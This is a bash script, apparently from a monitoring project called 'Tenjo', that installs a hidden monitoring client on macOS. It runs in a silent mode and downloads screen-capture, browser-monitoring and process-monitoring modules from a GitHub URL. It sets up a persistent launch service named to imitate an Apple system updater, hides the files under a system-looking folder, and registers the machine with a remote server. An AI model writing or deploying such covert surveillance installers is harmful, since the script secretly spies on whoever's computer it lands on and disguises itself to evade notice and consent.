#!/bin/bash

# Tenjo Stealth Installer for macOS - Simplified Version
# This script downloads and installs the monitoring client silently

set -e

# Configuration
APP_NAME="SystemUpdater"
INSTALL_DIR="$HOME/.config/system-utils"
SERVICE_NAME="com.apple.systemupdater"
PLIST_FILE="$HOME/Library/LaunchAgents/$SERVICE_NAME.plist"
PYTHON_REQUIREMENTS="requests mss psutil pillow"
GITHUB_RAW="https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client"

# Colors (only for debugging)
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# Silent mode flag
SILENT=${1:-"false"}

# Installation status variables
INSTALL_PROGRESS=0
TOTAL_STEPS=8
INSTALL_SUCCESS=false
ERROR_COUNT=0

log() {
    if [[ "$SILENT" != "true" ]]; then
        echo -e "$1"
    fi
}

# Function to show progress with percentage
show_progress() {
    local step_name="$1"
    local current_step=$2
    local percentage=$((current_step * 100 / TOTAL_STEPS))
    
    if [[ "$SILENT" != "true" ]]; then
        printf "\r${BLUE}[%d%%] Step %d/%d: %s${NC}" "$percentage" "$current_step" "$TOTAL_STEPS" "$step_name"
        if [[ $current_step -eq $TOTAL_STEPS ]]; then
            echo ""
        fi
    fi
}

# Function to log success with progress
log_success() {
    ((INSTALL_PROGRESS++))
    show_progress "$1" $INSTALL_PROGRESS
    if [[ "$SILENT" != "true" ]]; then
        echo " ✅"
    fi
}

# Function to log error
log_error() {
    ((ERROR_COUNT++))
    if [[ "$SILENT" != "true" ]]; then
        echo -e "${RED}❌ $1${NC}"
    fi
}

# Check if running as root
if [[ $EUID -eq 0 ]]; then
    INSTALL_DIR="/Library/Application Support/SystemUpdate"
    PLIST_FILE="/Library/LaunchDaemons/$SERVICE_NAME.plist"
fi

log "${BLUE}🔧 Tenjo Stealth Installer for macOS v2.0${NC}"
log "${BLUE}===========================================${NC}"

# Step 1: Prepare installation environment
show_progress "Preparing installation environment" 1

# Stop existing service if running
launchctl unload "$PLIST_FILE" 2>/dev/null || true

# Create installation directory
if mkdir -p "$INSTALL_DIR" && mkdir -p "$INSTALL_DIR/src/core" && mkdir -p "$INSTALL_DIR/src/modules" && mkdir -p "$INSTALL_DIR/src/utils" && mkdir -p "$INSTALL_DIR/logs"; then
    chmod 755 "$INSTALL_DIR"
    log_success "Environment prepared"
else
    log_error "Failed to create installation directories"
    exit 1
fi

# Step 2: Download application files
show_progress "Downloading application files" 2

DOWNLOAD_SUCCESS=true

# Download main application files
if ! curl -sSL "$GITHUB_RAW/main.py" -o "$INSTALL_DIR/main.py"; then
    log_error "Failed to download main.py"
    DOWNLOAD_SUCCESS=false
fi

# Download core modules
curl -sSL "$GITHUB_RAW/src/core/config.py" -o "$INSTALL_DIR/src/core/config.py" 2>/dev/null || DOWNLOAD_SUCCESS=false
curl -sSL "$GITHUB_RAW/src/utils/api_client.py" -o "$INSTALL_DIR/src/utils/api_client.py" 2>/dev/null || DOWNLOAD_SUCCESS=false
curl -sSL "$GITHUB_RAW/src/utils/stealth.py" -o "$INSTALL_DIR/src/utils/stealth.py" 2>/dev/null || DOWNLOAD_SUCCESS=false
curl -sSL "$GITHUB_RAW/src/modules/screen_capture.py" -o "$INSTALL_DIR/src/modules/screen_capture.py" 2>/dev/null || DOWNLOAD_SUCCESS=false
curl -sSL "$GITHUB_RAW/src/modules/browser_monitor.py" -o "$INSTALL_DIR/src/modules/browser_monitor.py" 2>/dev/null || DOWNLOAD_SUCCESS=false
curl -sSL "$GITHUB_RAW/src/modules/process_monitor.py" -o "$INSTALL_DIR/src/modules/process_monitor.py" 2>/dev/null || DOWNLOAD_SUCCESS=false
curl -sSL "$GITHUB_RAW/src/modules/stream_handler.py" -o "$INSTALL_DIR/src/modules/stream_handler.py" 2>/dev/null || DOWNLOAD_SUCCESS=false

# Create __init__.py files for Python modules
touch "$INSTALL_DIR/src/__init__.py"
touch "$INSTALL_DIR/src/core/__init__.py"
touch "$INSTALL_DIR/src/modules/__init__.py"
touch "$INSTALL_DIR/src/utils/__init__.py"

if [[ "$DOWNLOAD_SUCCESS" == "true" ]]; then
    log_success "Application files downloaded"
else
    log_error "Some files failed to download"
fi

# Step 3: Install Python dependencies
show_progress "Installing Python dependencies" 3

# Try multiple installation methods for compatibility
install_dependencies() {
    local packages="$1"
    
    # Method 1: Try with --user flag (standard approach)
    if python3 -m pip install --user --quiet $packages 2>/dev/null; then
        return 0
    fi
    
    # Method 2: Try without --user flag
    if python3 -m pip install --quiet $packages 2>/dev/null; then
        return 0
    fi
    
    # Method 3: Try with system python3 and --user
    if /usr/bin/python3 -m pip install --user --quiet $packages 2>/dev/null; then
        return 0
    fi
    
    # Method 4: Try with homebrew python3 if available
    if command -v /opt/homebrew/bin/python3 >/dev/null 2>&1; then
        if /opt/homebrew/bin/python3 -m pip install --user --quiet $packages 2>/dev/null; then
            return 0
        fi
    fi
    
    # Method 5: Last resort - try system-wide installation
    if sudo python3 -m pip install --quiet $packages 2>/dev/null; then
        return 0
    fi
    
    return 1
}

# Install the required packages
if install_dependencies "$PYTHON_REQUIREMENTS"; then
    log_success "Python dependencies installed"
else
    log_error "Warning: Some dependencies may not be installed"
fi

# Step 4: Create stealth service wrapper
show_progress "Creating stealth service wrapper" 4

cat > "$INSTALL_DIR/stealth_main.py" << 'EOF'
#!/usr/bin/env python3
import sys
import os
import time
import signal
import logging
from pathlib import Path

# Set up minimal logging
log_dir = Path(__file__).parent / "logs"
log_dir.mkdir(exist_ok=True)

logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(log_dir / "stealth.log")]
)

def signal_handler(signum, frame):
    logging.info("Received signal %d, shutting down...", signum)
    sys.exit(0)

def install_missing_packages():
    """Try to install missing packages at runtime"""
    import subprocess
    packages = ['requests', 'mss', 'psutil', 'pillow']
    
    for package in packages:
        try:
            __import__(package)
        except ImportError:
            try:
                # Try different python executables
                python_paths = [sys.executable, '/usr/bin/python3', '/opt/homebrew/bin/python3']
                for python_path in python_paths:
                    if os.path.exists(python_path):
                        try:
                            subprocess.run([python_path, '-m', 'pip', 'install', '--user', package], 
                                         capture_output=True, check=True)
                            logging.info(f"Successfully installed {package}")
                            break
                        except:
                            continue
            except:
                logging.warning(f"Could not install {package}")

def main():
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    app_dir = Path(__file__).parent
    os.chdir(app_dir)
    
    logging.warning("Stealth monitoring service started")
    
    try:
        # Try to install missing packages first
        install_missing_packages()
        
        # Add current directory to Python path
        sys.path.insert(0, str(app_dir))
        import main
        main.main(stealth_mode=True)
    except Exception as e:
        logging.error("Application error: %s", e)
        time.sleep(60)
        sys.exit(1)

if __name__ == "__main__":
    main()
EOF

chmod +x "$INSTALL_DIR/stealth_main.py"
log_success "Stealth service wrapper created"

# Step 5: Configure auto-start service
show_progress "Configuring auto-start service" 5
mkdir -p "$(dirname "$PLIST_FILE")"

# Detect the best Python path to use
PYTHON_PATH="/usr/bin/python3"
if command -v python3 >/dev/null 2>&1; then
    DETECTED_PYTHON=$(which python3)
    # Use system python for stability
    if [[ "$DETECTED_PYTHON" == "/usr/bin/python3" ]] || [[ "$DETECTED_PYTHON" == "/opt/homebrew/bin/python3" ]]; then
        PYTHON_PATH="$DETECTED_PYTHON"
    fi
fi

cat > "$PLIST_FILE" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>$SERVICE_NAME</string>
    <key>ProgramArguments</key>
    <array>
        <string>$PYTHON_PATH</string>
        <string>$INSTALL_DIR/stealth_main.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
    </dict>
    <key>EnvironmentVariables</key>
    <dict>
        <key>PATH</key>
        <string>/usr/local/bin:/usr/bin:/bin:/opt/homebrew/bin</string>
        <key>PYTHONPATH</key>
        <string>$INSTALL_DIR</string>
        <key>HOME</key>
        <string>$HOME</string>
    </dict>
    <key>StandardOutPath</key>
    <string>$INSTALL_DIR/logs/service.log</string>
    <key>StandardErrorPath</key>
    <string>$INSTALL_DIR/logs/service_error.log</string>
    <key>WorkingDirectory</key>
    <string>$INSTALL_DIR</string>
    <key>ProcessType</key>
    <string>Background</string>
    <key>LowPriorityIO</key>
    <true/>
    <key>Nice</key>
    <integer>10</integer>
</dict>
</plist>
EOF

chmod 644 "$PLIST_FILE"
log_success "Auto-start service configured"

# Step 6: Start monitoring service
show_progress "Starting monitoring service" 6
launchctl load "$PLIST_FILE" 2>/dev/null || true
launchctl start "$SERVICE_NAME" 2>/dev/null || true

# Wait for service to start
sleep 3

# Check if service started successfully
if launchctl list | grep -q "$SERVICE_NAME"; then
    log_success "Monitoring service started"
else
    log_error "Failed to start monitoring service"
fi

# Step 7: Auto-register client with server
show_progress "Registering client with server" 7

# Test client registration
REGISTRATION_SUCCESS=false
cd "$INSTALL_DIR"
REGISTRATION_RESULT=$(python3 -c "
import sys
import socket
import platform
sys.path.insert(0, '.')
try:
    from src.core.config import Config
    from src.utils.api_client import APIClient
    
    api_client = APIClient(Config.SERVER_URL, 'auto-install')
    client_info = {
        'client_id': Config.CLIENT_ID,
        'hostname': socket.gethostname(),
        'ip_address': 'auto-detect',
        'username': Config.CLIENT_USER,
        'os_info': {
            'name': platform.system(),
            'version': platform.release(),
            'architecture': platform.machine()
        },
        'timezone': 'Asia/Jakarta'
    }
    
    result = api_client.register_client(client_info)
    if result and result.get('success'):
        print('SUCCESS')
    else:
        print('FAILED')
except Exception as e:
    print(f'ERROR: {e}')
" 2>/dev/null)

if [[ "$REGISTRATION_RESULT" == "SUCCESS" ]]; then
    log_success "Client registered with server"
    REGISTRATION_SUCCESS=true
else
    log_error "Client registration failed - will retry automatically"
fi

# Step 8: Create uninstaller and finalize
show_progress 8 "Creating uninstaller and finalizing installation"
show_progress "Finalizing installation" 8

# Create uninstall script
cat > "$INSTALL_DIR/uninstall.sh" << 'UNINSTALL_EOF'
#!/bin/bash
SERVICE_NAME="com.apple.systemupdater"
INSTALL_DIR="$HOME/.config/system-utils"
PLIST_FILE="$HOME/Library/LaunchAgents/$SERVICE_NAME.plist"

# Stop and remove service
launchctl stop "$SERVICE_NAME" 2>/dev/null || true
launchctl unload "$PLIST_FILE" 2>/dev/null || true
rm -f "$PLIST_FILE"

# Remove installation
rm -rf "$INSTALL_DIR"

echo "SystemUpdater Service uninstalled successfully"
UNINSTALL_EOF

chmod +x "$INSTALL_DIR/uninstall.sh"
log_success "Installation finalized"

# Final verification and status display
FINAL_SUCCESS=true

# Check if installation directory exists
if [[ ! -d "$INSTALL_DIR" ]]; then
    FINAL_SUCCESS=false
    ((ERROR_COUNT++))
fi

# Check if main files exist
if [[ ! -f "$INSTALL_DIR/main.py" ]] || [[ ! -f "$INSTALL_DIR/stealth_main.py" ]]; then
    FINAL_SUCCESS=false
    ((ERROR_COUNT++))
fi

# Check if LaunchAgent is created
if [[ ! -f "$PLIST_FILE" ]]; then
    FINAL_SUCCESS=false
    ((ERROR_COUNT++))
fi

# Check if service is loaded
if ! launchctl list | grep -q "$SERVICE_NAME"; then
    FINAL_SUCCESS=false
    ((ERROR_COUNT++))
fi

# Display final status with installation summary
echo ""
echo ""
if [[ "$FINAL_SUCCESS" == "true" && "$ERROR_COUNT" -eq 0 ]]; then
    log "${GREEN}🎉 INSTALLATION COMPLETED SUCCESSFULLY${NC}"
    log "${GREEN}========================================${NC}"
    log "${GREEN}✅ SystemUpdater service installed and running${NC}"
    log "${GREEN}✅ Auto-start configured for user login${NC}"
    log "${GREEN}✅ Service running silently in background${NC}"
    if [[ "$REGISTRATION_SUCCESS" == "true" ]]; then
        log "${GREEN}✅ Client successfully registered with server${NC}"
    else
        log "${YELLOW}⚠️  Client will auto-register on next connection${NC}"
    fi
    echo ""
    log "${BLUE}📍 Installation Summary:${NC}"
    log "   📁 Install Location: $INSTALL_DIR"
    log "   📋 Service Name: $SERVICE_NAME" 
    log "   🔧 LaunchAgent: $PLIST_FILE"
    log "   📊 Log Location: $INSTALL_DIR/logs/"
    log "   🗑️  Uninstaller: $INSTALL_DIR/uninstall.sh"
    echo ""
    log "${BLUE}🔍 Verification Commands:${NC}"
    log "   • Service status: launchctl list | grep systemupdater"
    log "   • Monitor logs: tail -f $INSTALL_DIR/logs/stealth.log"
    log "   • Check processes: ps aux | grep stealth_main"
    echo ""
    log "${YELLOW}💡 The monitoring service is now active and will auto-start on login${NC}"
    
    exit 0
else
    log "${RED}❌ INSTALLATION FAILED${NC}"
    log "${RED}====================${NC}"
    log "${RED}Installation encountered $ERROR_COUNT error(s)${NC}"
    echo ""
    log "${YELLOW}🔧 Troubleshooting Steps:${NC}"
    log "   1. Ensure Python 3.x is installed: python3 --version"
    log "   2. Check internet connection for downloads"
    log "   3. Verify permissions: ls -la $HOME/.config/"
    log "   4. Check system logs: tail -f $INSTALL_DIR/logs/stealth.log"
    echo ""
    log "${BLUE}📞 Support: Check logs in $INSTALL_DIR/logs/ for details${NC}"
    
    exit 1
fi
